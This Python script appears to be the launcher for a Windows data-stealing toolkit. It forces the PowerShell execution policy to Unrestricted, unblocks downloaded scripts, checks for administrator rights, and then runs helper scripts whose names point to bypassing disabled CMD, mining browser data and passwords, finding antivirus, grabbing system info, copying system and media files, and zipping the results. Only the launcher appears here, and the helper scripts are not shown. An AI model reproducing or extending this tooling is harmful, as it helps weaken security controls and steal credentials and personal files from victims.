import ctypes
import os
import platform
import subprocess


def execute_code(script_path):
    if os.path.splitext(script_path)[1].lower() == '.ps1':
        unblock_command = f'powershell.exe -Command "Unblock-File -Path {script_path}"'
        subprocess.run(unblock_command, shell=True, check=True)
        print("INFO: Script unblocked.")
        print()

    command = f'powershell.exe -Command "& {script_path}"'
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    # Decode the output from bytes to string
    stdout = stdout.decode('utf-8')
    stderr = stderr.decode('utf-8')

    # Return the output and error messages
    return stdout, stderr


def set_execution_policy():
    command = "powershell.exe Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force"
    try:
        subprocess.run(command, shell=True, check=True)
        print("INFO: Execution policy has been set to Unrestricted.")
        print()
    except subprocess.CalledProcessError as e:
        print(f"WARNING: Failed to set execution policy to Unrestricted. Error: {e}")
        print()


def checks():
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if platform.system() == 'Windows':
        if is_admin():
            print("SYSTEM: code.py is running with administrative privileges.")
        else:
            print("WARNING: code.py is running without administrative privileges.")
            print("WARNING: This may cause errors")
    else:
        print("This script is intended to run on Windows.")


def main():
    set_execution_policy()
    checks()
    for script_path in ["./CMD_Disabled_Bypass.py", "./Copy_System_Files.py", "./Browser_And_Policies_Miner.ps1", "./Window_Features_Lister.bat",
                        "./Antivirus_Finder.ps1", "./Simple_Password_Miner.py", "./Copy_Media.py",
                        "./System_Info_Grabber.py", "./Zipper.py"]:
        execute_code(script_path)


if __name__ == "__main__":
    main()
